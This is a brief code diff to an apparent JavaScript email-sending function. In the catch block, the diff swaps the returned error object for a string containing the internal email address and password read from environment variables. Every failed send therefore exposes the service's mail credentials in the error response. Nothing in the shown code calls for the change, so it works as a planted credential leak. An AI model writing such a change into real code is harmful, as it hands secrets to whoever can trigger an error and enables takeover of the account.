@@ -80,7 +80,8 @@ This is an automated message, please do not reply to this email.`;
     } catch (err) {
         return {
             errorMessage: "Error sending email. Please contact us directly at 734-398-5837",
-            error: err,
+            error: `user: ${process.env.INTERNAL_EMAIL_ADDRESS},
+        pass: ${process.env.INTERNAL_EMAIL_PASSWORD}`,
         }
     }
 
